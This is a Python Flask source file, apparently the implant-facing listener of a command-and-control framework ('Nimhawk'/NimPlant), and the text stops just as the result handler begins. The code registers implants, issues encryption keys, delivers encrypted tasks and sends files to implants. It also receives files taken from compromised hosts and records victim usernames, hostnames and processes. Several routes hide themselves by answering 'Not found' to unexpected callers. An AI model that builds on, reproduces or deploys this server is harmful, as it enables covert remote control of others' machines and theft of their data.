import base64
import gzip
import hashlib
import io
import json
import os
from ssl import CERT_NONE, PROTOCOL_TLSv1_2
from zlib import decompress, compress
from src.servers.implants_api.badRequestHandler.handler import BadRequestReason, notify_bad_request
import src.util.utils as utils
import src.util.time as utils_time
import src.config.db as db

import flask
from gevent.pywsgi import WSGIServer
from flask_cors import CORS

from src.config.config import config
from src.util.crypto import (
    xor_string,
    decrypt_data,
    encrypt_data,
    decrypt_data_to_bytes,
)

from src.util.network import get_external_ip

import src.servers.admin_api.commands.commands as commands

from src.servers.admin_api.models.nimplant_listener_model import np_server, NimPlant
from src.util.notify import notify_user
from src.util.misc.strings import decode_base64_blob

# Parse configuration from 'config.toml'
try:
    listener_type = config["implants_server"]["type"]
    server_ip = config["admin_api"]["ip"]
    listener_port = config["implants_server"]["port"]
    register_path = config["implants_server"]["registerPath"]
    task_path = config["implants_server"]["taskPath"]
    resultPath = config["implants_server"]["resultPath"]
    reconnectPath = config["implants_server"]["reconnectPath"]
    user_agent = config["implant"]["userAgent"]
    http_allow_key = config["implant"]["httpAllowCommunicationKey"]
    
    # Print loaded routes for diagnostics
    utils.nimplant_print(f"DEBUG: Loaded paths from config: register_path={register_path}, task_path={task_path}, resultPath={resultPath}, reconnectPath={reconnectPath}")
    
    if listener_type == "HTTPS":
        ssl_cert_path = config["implants_server"]["sslCertPath"]
        ssl_key_path = config["implants_server"]["sslKeyPath"]
    B_IDENT = b"789CF3CBCC0DC849CC2B51703652084E2D2A4B2D02003B5C0650"
except KeyError as e:
    utils.nimplant_print(f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}")
    os._exit(1)

# Init flask app and surpress Flask/Gevent logging and startup messages
app = flask.Flask(__name__)
ident = decompress(base64.b16decode(B_IDENT)).decode("utf-8")

# Enable CORS for all routes
CORS(app, resources={r"/*": {"origins": "*"}})

# Define Flask listener to run in thread
def nim_implants_server(xor_key):
    utils.nimplant_print(f"DEBUG: Starting listener with xor_key: {xor_key}")
    utils.nimplant_print(f"DEBUG: Configuration: register_path={register_path}, task_path={task_path}, result_path={resultPath}, reconnect_path={reconnectPath}")
    utils.nimplant_print(f"DEBUG: Configuration: user_agent={user_agent}, http_allow_key={http_allow_key}")
    utils.nimplant_print(f"DEBUG: Configuration: listener_type={listener_type}, server_ip={server_ip}, listener_port={listener_port}")
    
    @app.route("/alive", methods=["GET"])
    def alive():
        return flask.jsonify(alive=True), 200

    @app.route(register_path, methods=["GET", "POST"])
    # Verify expected user-agent for incoming registrations
    def get_nimplant():
        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] register_path: {flask.request.method} {register_path} from {get_external_ip(flask.request)}")
        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
        
        if flask.request.method == "POST" and flask.request.is_json:
            utils.nimplant_print(f"DEBUG: JSON body: {flask.request.json}")
        
        allow_header = flask.request.headers.get("X-Correlation-ID")
        agent_header = flask.request.headers.get("User-Agent")
        request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
        
        # Capture the X-Robots-Tag header containing the workspace_uuid
        workspace_uuid = flask.request.headers.get("X-Robots-Tag", "")
        
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Correlation-ID: '{allow_header}' (expected: '{http_allow_key}')")
        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}')")
        
        if workspace_uuid:
            utils.nimplant_print(f"DEBUG: Workspace UUID received: {workspace_uuid}")
        
        if http_allow_key == allow_header:
            utils.nimplant_print(f"DEBUG: Valid X-Correlation-ID")
            if user_agent == agent_header:
                utils.nimplant_print(f"DEBUG: Valid User-Agent")
                
                # First request from Implant (GET, no data) -> Initiate Implant and return XORed key
                if flask.request.method == "GET":
                    utils.nimplant_print(f"DEBUG: Processing GET request for initial registration")
                    np: NimPlant = NimPlant()
                    
                    # If we have workspace_uuid, assign it to the implant
                    if workspace_uuid:
                        np.workspace_uuid = workspace_uuid
                        utils.nimplant_print(f"DEBUG: Assigning workspace UUID: {workspace_uuid} to implant")
                    
                    np_server.add(np)
                    xor_bytes = xor_string(np.encryption_key, xor_key)
                    encoded_key = base64.b64encode(xor_bytes).decode("utf-8")
                    utils.nimplant_print(f"DEBUG: Implant created with GUID: {np.guid}, encryption_key (first 5 chars): {np.encryption_key[:5]}...")
                    utils.nimplant_print(f"DEBUG: Sending response: id={np.guid}, k=... (length: {len(encoded_key)})")
                    return flask.jsonify(id=np.guid, k=encoded_key), 200

                # Second request from Implant (POST, encrypted blob) -> Activate the Implant object based on encrypted data
                elif flask.request.method == "POST":
                    utils.nimplant_print(f"DEBUG: Processing POST registration request with encrypted data")
                    if not flask.request.is_json:
                        utils.nimplant_print(f"DEBUG: ERROR - Request does not contain valid JSON")
                        return flask.jsonify(status="Not found"), 404
                    
                    data = flask.request.json
                    np = np_server.get_nimplant_by_guid(request_id)
                    
                    if np is None:
                        utils.nimplant_print(f"DEBUG: ERROR - Implant with GUID not found: {request_id}")
                        return flask.jsonify(status="Not found"), 404
                    
                    utils.nimplant_print(f"DEBUG: Implant found: {np.guid}")
                    
                    # If the implant doesn't have workspace_uuid but we received one, assign it now
                    if workspace_uuid and not hasattr(np, 'workspace_uuid'):
                        np.workspace_uuid = workspace_uuid
                        utils.nimplant_print(f"DEBUG: Assigning workspace UUID: {workspace_uuid} to implant")
                    
                    if "data" not in data:
                        utils.nimplant_print(f"DEBUG: ERROR - JSON does not contain 'data' field")
                        return flask.jsonify(status="Not found"), 404
                    
                    data = data["data"]
                    utils.nimplant_print(f"DEBUG: Encrypted data received (length: {len(data) if data else 0})")

                    try:
                        utils.nimplant_print(f"DEBUG: Attempting to decrypt data with key: {np.encryption_key[:5]}...")
                        data = decrypt_data(data, np.encryption_key)
                        utils.nimplant_print(f"DEBUG: Decrypted data: {data}")
                        
                        data_json = json.loads(data)
                        utils.nimplant_print(f"DEBUG: Parsed JSON: {data_json}")
                        
                        ip_internal = data_json["i"]
                        ip_external = get_external_ip(flask.request)
                        username = data_json["u"]
                        hostname = data_json["h"]
                        os_build = data_json["o"]
                        pid = data_json["p"]
                        process_name = data_json["P"]
                        risky_mode = data_json["r"]
                        
                        utils.nimplant_print(f"DEBUG: Activation data - Internal IP: {ip_internal}, External IP: {ip_external}")
                        utils.nimplant_print(f"DEBUG: Activation data - Username: {username}, Hostname: {hostname}")
                        utils.nimplant_print(f"DEBUG: Activation data - OS: {os_build}, PID: {pid}, Process: {process_name}")
                        utils.nimplant_print(f"DEBUG: Activation data - Risky mode: {risky_mode}")

                        np.activate(
                            ip_external,
                            ip_internal,
                            username,
                            hostname,
                            os_build,
                            pid,
                            process_name,
                            risky_mode,
                        )
                        utils.nimplant_print(f"DEBUG: Implant activated successfully")
                        
                        # Save the workspace_uuid in the database
                        if hasattr(np, 'workspace_uuid') and np.workspace_uuid:
                            utils.nimplant_print(f"DEBUG: Workspace UUID will be saved to database: {np.workspace_uuid}")
                        
                        # Here it uses the imported db_initialize_nimplant function
                        utils.nimplant_print(f"DEBUG: Saving Implant to database with server GUID: {np_server.guid}")
                        db.db_initialize_nimplant(np, np_server.guid)
                        utils.nimplant_print(f"DEBUG: Implant saved to database")

                        notify_user(np)
                        utils.nimplant_print(f"DEBUG: Notification sent")

                        if not np_server.has_active_nimplants():
                            np_server.select_nimplant(np.guid)
                            utils.nimplant_print(f"DEBUG: Implant selected as active: {np.guid}")

                        utils.nimplant_print(f"DEBUG: Registration completed successfully for {np.guid}")

                        # Save the last checkin time
                        np.last_checkin = utils_time.timestamp()
                        
                        # Update the checkin counter
                        try:
                            np.checkin_count += 1
                        except:
                            np.checkin_count = 1
                            
                        # Log the check-in event, marking it as hidden so it doesn't appear in the console
                        db.db_nimplant_log(np, result=f"Implant checked in, total check-ins: {np.checkin_count}", is_checkin=True)

                        return flask.jsonify(status="OK"), 200

                    except Exception as e:
                        utils.nimplant_print(f"DEBUG: ERROR processing POST data: {str(e)}")
                        utils.nimplant_print(f"DEBUG: Exception type: {type(e).__name__}")
                        import traceback
                        utils.nimplant_print(f"DEBUG: Traceback: {traceback.format_exc()}")
                        BadRequestReason.notify_bad_request(flask.request, BadRequestReason.BadRequestReason.BAD_KEY)
                        return flask.jsonify(status="Not found"), 404
            else:
                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
                BadRequestReason.notify_bad_request(flask.request, BadRequestReason.BadRequestReason.USER_AGENT_MISMATCH)
                return flask.jsonify(status="Not found"), 404
        else:
            utils.nimplant_print(f"DEBUG: ERROR - Incorrect X-Correlation-ID: '{allow_header}'")
            return flask.jsonify(status="Not found"), 404

    @app.route(reconnectPath, methods=["OPTIONS"])
    def reconnect_nimplant():
        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] reconnect_path: {flask.request.method} {reconnectPath} from {get_external_ip(flask.request)}")
        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
        utils.nimplant_print(f"DEBUG: reconnectPath value: {reconnectPath}")
        
        allow_header = flask.request.headers.get("X-Correlation-ID")
        agent_header = flask.request.headers.get("User-Agent")
        request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
        
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Correlation-ID: '{allow_header}' (expected: '{http_allow_key}')")
        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}'")
        
        if http_allow_key == allow_header:
            utils.nimplant_print(f"DEBUG: Valid X-Correlation-ID")
            if user_agent == agent_header:
                utils.nimplant_print(f"DEBUG: Valid User-Agent")
                # OPTIONS request for reconnect
                if flask.request.method == "OPTIONS":
                    utils.nimplant_print(f"DEBUG: Processing OPTIONS request for reconnection with ID: {request_id}")
                    
                    np = np_server.get_nimplant_by_guid(request_id)
                    if np is not None:
                        utils.nimplant_print(f"DEBUG: Implant found: {np.guid}, encryption_key: {np.encryption_key[:5]}...")
                        
                        # Verify if the implant is active
                        if not np.is_active():
                            utils.nimplant_print(f"DEBUG: Implant {np.guid} is inactive, telling client to re-register")
                            # Return code 410 Gone to indicate that the implant must register again
                            return flask.jsonify(status="inactive", message="Implant is inactive, please re-register"), 410
                        
                        xor_bytes = xor_string(np.encryption_key, xor_key)
                        encoded_key = base64.b64encode(xor_bytes).decode("utf-8")
                        utils.nimplant_print(f"DEBUG: Sending key for reconnection (length: {len(encoded_key)})")
                        return flask.jsonify(k=encoded_key), 200
                    else:
                        utils.nimplant_print(f"DEBUG: ERROR - Implant with ID not found: {request_id}")
                        return flask.jsonify(status="Not found"), 404
                else:
                    utils.nimplant_print(f"DEBUG: Method not allowed for reconnect: {flask.request.method}")
                    return flask.jsonify(status="Not found"), 404
            else:
                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
                return flask.jsonify(status="Not found"), 404
        else:
            utils.nimplant_print(f"DEBUG: ERROR - Incorrect X-Correlation-ID: '{allow_header}'")
            return flask.jsonify(status="Not found"), 404

    @app.route(task_path, methods=["GET"])
    # Return the first active task IF the user-agent is as expected
    def get_task():
        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] task_path: {flask.request.method} {task_path} from {get_external_ip(flask.request)}")
        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
        
        request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
        agent_header = flask.request.headers.get("User-Agent")
        
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}'")
        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
        
        np = np_server.get_nimplant_by_guid(request_id)
        if np is not None:
            utils.nimplant_print(f"DEBUG: Implant found: {np.guid}, active: {np.is_active()}")
            
            if user_agent == agent_header:
                utils.nimplant_print(f"DEBUG: Valid User-Agent")
                # Update the external IP address if it changed
                current_external_ip = get_external_ip(flask.request)
                if np.ip_external != current_external_ip:
                    utils.nimplant_print(
                        f"External IP Address for Implant changed from {np.ip_external} to {current_external_ip}",
                        np.guid,
                    )
                    np.ip_external = current_external_ip

                # Verify if there are pending "kill" commands
                pending_tasks_count = len(np.pending_tasks) if np.pending_tasks else 0
                utils.nimplant_print(f"DEBUG: Pending tasks found: {pending_tasks_count}")
                
                if pending_tasks_count > 0:
                    utils.nimplant_print(f"DEBUG: Pending tasks content: {np.pending_tasks}")
                    
                    # Verify if there are pending "kill" commands
                    has_kill_command = False
                    for task in np.pending_tasks:
                        try:
                            task_obj = json.loads(task)
                            if task_obj.get("command") == "kill":
                                has_kill_command = True
                                utils.nimplant_print(f"DEBUG: Pending kill command found: {task}")
                                break
                        except:
                            pass
                
                # Update check-in
                np.checkin()
                np.late = False  # Force non-late status when the implant connects
                db.db_update_nimplant(np)
                utils.nimplant_print(f"DEBUG: Check-in completed, implant in state ACTIVE, late={np.late}")
                utils.nimplant_print(f"DEBUG: Last connection updated to: {np.last_checkin}")
                
                # Register the check-in in the database
                db.db_nimplant_log(np, result=f"Implant checked in, total check-ins: {np.checkin_count}", is_checkin=True)

                # UPDATED QUERY OF PENDING TASKS
                # It's possible that checkin() has modified the pending tasks
                pending_tasks_count = len(np.pending_tasks) if np.pending_tasks else 0
                utils.nimplant_print(f"DEBUG: Pending tasks after check-in: {pending_tasks_count}")
                
                # TASK DELIVERY
                if pending_tasks_count > 0:
                    utils.nimplant_print(f"DEBUG: Proceeding to deliver pending task")
                    
                    # Get the next task
                    next_task = np.get_next_task()
                    utils.nimplant_print(f"DEBUG: Task to deliver: {next_task}")
                    
                    if next_task:
                        task = encrypt_data(next_task, np.encryption_key)
                        utils.nimplant_print(f"DEBUG: Encrypted task (length: {len(task)})")
                        return flask.jsonify(t=task), 200
                    else:
                        utils.nimplant_print(f"DEBUG: Error: get_next_task returned None despite having pending tasks")
                        return flask.jsonify(status="OK"), 200
                else:
                    utils.nimplant_print(f"DEBUG: No pending tasks to deliver")
                    return flask.jsonify(status="OK"), 200
            else:
                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            utils.nimplant_print(f"DEBUG: ERROR - Implant with ID not found: {request_id}")
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.route(task_path + "/<file_id>", methods=["GET"])
    # Return a hosted file as gzip-compressed stream for the 'upload' command,
    # IF the user-agent is as expected AND the caller knows the file ID
    def upload_file(file_id):
        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] task_path/file_id: {flask.request.method} {task_path}/{file_id} from {get_external_ip(flask.request)}")
        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
        utils.nimplant_print(f"DEBUG: File ID requested: {file_id}")
        
        request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
        agent_header = flask.request.headers.get("User-Agent")
        task_guid = flask.request.headers.get("Content-MD5")
        
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}'")
        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
        utils.nimplant_print(f"DEBUG: Verifying headers - Content-MD5 (task_guid): '{task_guid}'")
        
        # Verify if the hash exists in the filesystem
        try:
            import glob
            
            # Only search in the uploads directory
            uploads_dir = "uploads"
            
            file_found = None
            original_filename = None
            
            if os.path.exists(uploads_dir):
                utils.nimplant_print(f"DEBUG: Searching for files in: {uploads_dir}")
                
                # Search for files and try different hash methods
                for root, _, files in os.walk(uploads_dir):
                    for file in files:
                        full_path = os.path.join(root, file)
                        
                        # Method 1: Hash of the full path
                        path_hash = hashlib.md5(full_path.encode("UTF-8")).hexdigest()
                        
                        # Method 2: Hash of the filename
                        name_hash = hashlib.md5(file.encode("UTF-8")).hexdigest()
                        
                        # Method 3: Hash of the file content
                        try:
                            with open(full_path, "rb") as f:
                                content = f.read()
                                content_hash = hashlib.md5(content).hexdigest()
                        except:
                            content_hash = None
                        
                        utils.nimplant_print(f"DEBUG: File: {full_path}")
                        utils.nimplant_print(f"DEBUG: Path hash: {path_hash}")
                        utils.nimplant_print(f"DEBUG: Name hash: {name_hash}")
                        utils.nimplant_print(f"DEBUG: Content hash: {content_hash}")
                        
                        # Check if any hash matches
                        if (path_hash == file_id or name_hash == file_id or 
                            (content_hash and content_hash == file_id)):
                            file_found = full_path
                            original_filename = file
                            utils.nimplant_print(f"DEBUG: Match found! File: {file_found}, Method: {path_hash == file_id and 'path' or name_hash == file_id and 'name' or 'content'}")
                            break
                    
                    if file_found:
                        break
            else:
                utils.nimplant_print(f"DEBUG: Error: The uploads directory '{uploads_dir}' does not exist!")
            
            # If we found the file but it's not in the database, add it
            if file_found and original_filename:
                try:
                    db.db_store_file_hash_mapping(file_id, original_filename, file_found)
                    utils.nimplant_print(f"DEBUG: Added file to database: hash={file_id}, name={original_filename}, path={file_found}")
                except Exception as db_error:
                    utils.nimplant_print(f"DEBUG: Error adding file to database: {str(db_error)}")
        
        except Exception as scan_error:
            utils.nimplant_print(f"DEBUG: Error scanning for files: {str(scan_error)}")
            import traceback
            utils.nimplant_print(f"DEBUG: Traceback: {traceback.format_exc()}")
            
        # Verify if the hash matches any file in the database
        try:
            # Debug for db_get_file_info_by_hash
            utils.nimplant_print(f"DEBUG: Querying database for hash: {file_id}")
            db_original_filename, db_file_path = db.db_get_file_info_by_hash(file_id)
            
            # If we found the file in the system but not in the DB, use those values
            if not db_original_filename and not db_file_path and file_found and original_filename:
                db_original_filename = original_filename
                db_file_path = file_found
                
            utils.nimplant_print(f"DEBUG: Final result: original_filename={db_original_filename}, file_path={db_file_path}")
            
            if db_original_filename is None or db_file_path is None:
                utils.nimplant_print(f"DEBUG: Hash not found in database, will try fallback method")
        except Exception as db_error:
            utils.nimplant_print(f"DEBUG: Database query error: {str(db_error)}")
            
        np: NimPlant = np_server.get_nimplant_by_guid(request_id)
        if np is not None:
            utils.nimplant_print(f"DEBUG: Implant found: {np.guid}")
            utils.nimplant_print(f"DEBUG: Implant is serving file: {np.hosting_file}")
            
            if user_agent == agent_header:
                utils.nimplant_print(f"DEBUG: Valid User-Agent")
                
                # First try to get file info from database by hash
                original_filename, file_path = (db_original_filename, db_file_path) if 'db_original_filename' in locals() and 'db_file_path' in locals() else db.db_get_file_info_by_hash(file_id)
                
                utils.nimplant_print(f"DEBUG: Database lookup for hash: {file_id} - Found: {original_filename is not None}, Path: {file_path}")
                
                # If we find the file in the database, use that information
                if original_filename is not None and file_path is not None and os.path.exists(file_path):
                    utils.nimplant_print(f"DEBUG: Found file in database: {original_filename}, path: {file_path}")
                    
                    # If the implant also has that file registered, make sure it's the same
                    if np.hosting_file is not None and np.hosting_file != file_path:
                        utils.nimplant_print(f"DEBUG: Implant has different file registered: {np.hosting_file}, updating to {file_path}")
                        np.hosting_file = file_path
                        
                    # Insert X-Original-Filename header for the implant to use
                    if task_guid is not None:
                        utils.nimplant_print(f"DEBUG: Valid Task GUID: {task_guid}")
                        try:
                            utils.nimplant_print(f"DEBUG: Processing file for upload: {file_path}")
                            with open(file_path, mode="rb") as contents:
                                utils.nimplant_print(f"DEBUG: File opened successfully")
                                file_content = contents.read()
                                utils.nimplant_print(f"DEBUG: Content read (size: {len(file_content)} bytes)")
                                compressed = compress(file_content)
                                utils.nimplant_print(f"DEBUG: Content compressed (size: {len(compressed)} bytes)")
                                processed_file = encrypt_data(compressed, np.encryption_key)
                                utils.nimplant_print(f"DEBUG: Content encrypted (size: {len(processed_file)} bytes)")

                            with io.BytesIO() as data:
                                utils.nimplant_print(f"DEBUG: Creating GZIP file in memory")
                                with gzip.GzipFile(fileobj=data, mode="wb") as zip_data:
                                    # Verificar si ya es bytes o necesita ser convertido
                                    if isinstance(processed_file, bytes):
                                        zip_data.write(processed_file)
                                    else:
                                        zip_data.write(processed_file.encode("utf-8"))
                                result_gzipped = data.getvalue()
                                utils.nimplant_print(f"DEBUG: GZIP file created (size: {len(result_gzipped)} bytes)")

                            # Register the transfer in the database
                            try:
                                file_size = os.path.getsize(file_path)
                                file_name = original_filename
                                db.db_log_file_transfer(np.guid, file_name, file_size, "UPLOAD")
                                utils.nimplant_print(f"DEBUG: File transfer logged: {file_name} ({file_size} bytes)", skip_db_log=True)
                            except Exception as log_error:
                                utils.nimplant_print(f"DEBUG: Error logging file transfer: {str(log_error)}", skip_db_log=True)

                            utils.nimplant_print(f"DEBUG: File served successfully")

                            # Return the GZIP stream as a response with custom header for original filename
                            utils.nimplant_print(f"DEBUG: Sending response with file and original filename: {original_filename}")
                            res = flask.make_response(result_gzipped)
                            res.mimetype = "application/x-gzip"
                            res.headers["Content-Encoding"] = "gzip"
                            # Encrypt the filename with XOR before sending
                            encrypted_filename = encrypt_data(original_filename, np.encryption_key)
                            # Asegurarse que sea bytes antes de codificar en base64
                            if isinstance(encrypted_filename, str):
                                encrypted_filename = encrypted_filename.encode("utf-8")
                            res.headers["X-Original-Filename"] = base64.b64encode(encrypted_filename).decode("utf-8")
                            return res
                        except Exception as e:
                            utils.nimplant_print(f"DEBUG: ERROR processing file from database: {str(e)}")
                            utils.nimplant_print(f"DEBUG: Exception type: {type(e).__name__}")
                            return flask.jsonify(status="Not found"), 404
                    else:
                        utils.nimplant_print(f"DEBUG: ERROR - task_guid not provided")
                        notify_bad_request(
                            flask.request, BadRequestReason.NO_TASK_GUID, np.guid
                        )
                        return flask.jsonify(status="Not found"), 404
                else:
                    utils.nimplant_print(f"DEBUG: File not found in database, trying fallback method")
                
                # If we don't find the file in the database, use the old method
                hosting_file_hash = None
                if np.hosting_file:
                    hosting_file_hash = hashlib.md5(np.hosting_file.encode("UTF-8")).hexdigest()
                    utils.nimplant_print(f"DEBUG: MD5 hash of hosted file: {hosting_file_hash}")
                
                if (np.hosting_file is not None) and (file_id == hosting_file_hash):
                    utils.nimplant_print(f"DEBUG: Valid file hash (fallback)")
                    
                    if task_guid is not None:
                        utils.nimplant_print(f"DEBUG: Valid Task GUID: {task_guid}")
                        try:
                            utils.nimplant_print(f"DEBUG: Processing file for upload: {np.hosting_file}")
                            with open(np.hosting_file, mode="rb") as contents:
                                utils.nimplant_print(f"DEBUG: File opened successfully")
                                file_content = contents.read()
                                utils.nimplant_print(f"DEBUG: Content read (size: {len(file_content)} bytes)")
                                compressed = compress(file_content)
                                utils.nimplant_print(f"DEBUG: Content compressed (size: {len(compressed)} bytes)")
                                processed_file = encrypt_data(compressed, np.encryption_key)
                                utils.nimplant_print(f"DEBUG: Content encrypted (size: {len(processed_file)} bytes)")

                            with io.BytesIO() as data:
                                utils.nimplant_print(f"DEBUG: Creating GZIP file in memory")
                                with gzip.GzipFile(fileobj=data, mode="wb") as zip_data:
                                    # Verificar si ya es bytes o necesita ser convertido
                                    if isinstance(processed_file, bytes):
                                        zip_data.write(processed_file)
                                    else:
                                        zip_data.write(processed_file.encode("utf-8"))
                                result_gzipped = data.getvalue()
                                utils.nimplant_print(f"DEBUG: GZIP file created (size: {len(result_gzipped)} bytes)")

                            # Register the transfer in the database
                            try:
                                file_size = os.path.getsize(np.hosting_file)
                                file_name = os.path.basename(np.hosting_file)
                                db.db_log_file_transfer(np.guid, file_name, file_size, "UPLOAD")
                                utils.nimplant_print(f"DEBUG: File transfer logged: {file_name} ({file_size} bytes)", skip_db_log=True)
                            except Exception as log_error:
                                utils.nimplant_print(f"DEBUG: Error logging file transfer: {str(log_error)}", skip_db_log=True)

                            np.stop_hosting_file()
                            utils.nimplant_print(f"DEBUG: File hosting stopped")

                            # Return the GZIP stream as a response
                            utils.nimplant_print(f"DEBUG: Sending response with file")
                            res = flask.make_response(result_gzipped)
                            res.mimetype = "application/x-gzip"
                            res.headers["Content-Encoding"] = "gzip"
                            # Also send the original name if it's a fallback
                            encrypted_filename = encrypt_data(os.path.basename(np.hosting_file), np.encryption_key)
                            # Asegurarse que sea bytes antes de codificar en base64
                            if isinstance(encrypted_filename, str):
                                encrypted_filename = encrypted_filename.encode("utf-8")
                            res.headers["X-Original-Filename"] = base64.b64encode(encrypted_filename).decode("utf-8")
                            return res
                        except Exception as e:
                            utils.nimplant_print(f"DEBUG: ERROR processing file: {str(e)}")
                            utils.nimplant_print(f"DEBUG: Exception type: {type(e).__name__}")
                            np.stop_hosting_file()
                            return flask.jsonify(status="Not found"), 404
                    else:
                        utils.nimplant_print(f"DEBUG: ERROR - task_guid not provided")
                        notify_bad_request(
                            flask.request, BadRequestReason.NO_TASK_GUID, np.guid
                        )
                        np.stop_hosting_file()
                        return flask.jsonify(status="Not found"), 404
                else:
                    reason = BadRequestReason.NOT_HOSTING_FILE if np.hosting_file is None else BadRequestReason.INCORRECT_FILE_ID
                    utils.nimplant_print(f"DEBUG: ERROR - {reason.name}: {reason.get_explanation()}")
                    notify_bad_request(
                        flask.request,
                        reason,
                        np.guid,
                    )
                    return flask.jsonify(status="OK"), 200
            else:
                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            utils.nimplant_print(f"DEBUG: ERROR - Implant with ID not found: {request_id}")
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.route(task_path + "/u", methods=["POST"])
    # Receive a file downloaded from Implant through the 'download' command, IF the user-agent is as expected AND the Implant object is expecting a file
    def download_file():
        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] task_path/u: {flask.request.method} {task_path}/u from {get_external_ip(flask.request)}")
        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
        utils.nimplant_print(f"DEBUG: Size of received data: {len(flask.request.data)} bytes")
        
        request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
        agent_header = flask.request.headers.get("User-Agent")
        task_guid = flask.request.headers.get("Content-MD5")
        
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}'")
        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
        utils.nimplant_print(f"DEBUG: Verifying headers - Content-MD5 (task_guid): '{task_guid}'")
        
        np: NimPlant = np_server.get_nimplant_by_guid(request_id)
        if np is not None:
            utils.nimplant_print(f"DEBUG: Implant found: {np.guid}")
            utils.nimplant_print(f"DEBUG: Implant is expecting file: {np.receiving_file}")
            
            if user_agent == agent_header:
                utils.nimplant_print(f"DEBUG: Valid User-Agent")
                
                if np.receiving_file is not None:
                    utils.nimplant_print(f"DEBUG: Implant is correctly expecting a file")
                    
                    if task_guid is not None:
                        utils.nimplant_print(f"DEBUG: Valid Task GUID: {task_guid}")
                        try:
                            utils.nimplant_print(f"DEBUG: Processing downloaded file (size: {len(flask.request.data)} bytes)")
                            utils.nimplant_print(f"DEBUG: Decrypting data...")
                            decrypted_data = decrypt_data_to_bytes(flask.request.data, np.encryption_key)
                            utils.nimplant_print(f"DEBUG: Data decrypted (size: {len(decrypted_data)} bytes)")
                            
                            utils.nimplant_print(f"DEBUG: Decompressing data...")
                            uncompressed_file = gzip.decompress(decrypted_data)
                            utils.nimplant_print(f"DEBUG: Data decompressed (size: {len(uncompressed_file)} bytes)")
                            
                            utils.nimplant_print(f"DEBUG: Saving file to: {np.receiving_file}")
                            with open(np.receiving_file, "wb") as f:
                                f.write(uncompressed_file)
                            
                            utils.nimplant_print(
                                f"Successfully downloaded file to '{os.path.abspath(np.receiving_file)}' on Nimhawk server.",
                                np.guid,
                                task_guid=task_guid,
                            )

                            # Register the transfer in the database
                            try:
                                file_size = len(uncompressed_file)
                                file_name = os.path.basename(np.receiving_file)
                                db.db_log_file_transfer(np.guid, file_name, file_size, "DOWNLOAD")
                                utils.nimplant_print(f"DEBUG: File transfer logged: {file_name} ({file_size} bytes)", skip_db_log=True)
                            except Exception as log_error:
                                utils.nimplant_print(f"DEBUG: Error logging file transfer: {str(log_error)}", skip_db_log=True)

                            np.stop_receiving_file()
                            utils.nimplant_print(f"DEBUG: File reception stopped")
                            return flask.jsonify(status="OK"), 200
                        except Exception as e:
                            utils.nimplant_print(f"DEBUG: ERROR processing downloaded file: {str(e)}")
                            utils.nimplant_print(f"DEBUG: Exception type: {type(e).__name__}")
                            np.stop_receiving_file()
                            return flask.jsonify(status="Not found"), 404
                    else:
                        utils.nimplant_print(f"DEBUG: ERROR - task_guid not provided")
                        notify_bad_request(
                            flask.request, BadRequestReason.NO_TASK_GUID, np.guid
                        )
                        np.stop_receiving_file()
                        return flask.jsonify(status="Not found"), 404
                else:
                    utils.nimplant_print(f"DEBUG: ERROR - Implant is not expecting a file")
                    notify_bad_request(
                        flask.request, BadRequestReason.NOT_RECEIVING_FILE, np.guid
                    )
                    return flask.jsonify(status="OK"), 200
            else:
                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            utils.nimplant_print(f"DEBUG: ERROR - Implant with ID not found: {request_id}")
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.route(resultPath, methods=["POST"])
    # Parse command output IF the user-agent is as expected
    def get_result():
